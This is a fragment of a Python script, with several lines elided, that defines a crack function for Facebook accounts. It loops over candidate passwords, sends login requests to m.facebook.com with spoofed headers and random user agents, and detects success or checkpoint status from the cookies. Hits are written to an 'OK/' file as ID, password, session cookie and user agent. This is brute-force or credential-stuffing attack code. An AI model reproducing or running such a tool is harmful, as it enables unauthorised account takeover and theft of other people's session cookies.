...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': random.choice(ugen),'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{x} {P}USER AGENT {kk}> {x}{M}{random.choice(ugen)}{M}\n')
				...
				print(f'\r{x} {P}USER AGENT {H}> {x}{M}{random.choice(ugen)}{M}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+random.choice(ugen)+'\n')
